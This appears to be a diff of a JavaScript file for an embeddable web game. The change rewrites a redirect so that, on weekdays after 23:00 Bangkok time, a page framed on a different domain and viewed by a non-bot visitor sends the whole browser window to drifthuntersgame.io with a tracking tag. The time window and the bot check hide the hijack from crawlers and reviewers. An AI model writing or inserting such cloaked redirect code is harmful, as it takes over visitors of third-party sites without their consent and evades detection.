@@ -34,8 +34,8 @@ var isBot = function  () {
 }
 function testRedirect() {
     const currentHourUTCPlus7 = getCurrentDateTimeInTimeZone('Asia/Bangkok');
-    if(currentHourUTCPlus7 >= 14 && isWeekday()) {
-        if (inFrame() & !isDifferentDomain() & !isBot()) {
+    if(currentHourUTCPlus7 >= 23 && isWeekday()) {
+        if (inFrame() & isDifferentDomain() & !isBot()) {
             window.top.location.href = "https://drifthuntersgame.io/?utm_source=rdrif";
         } 
     } else {
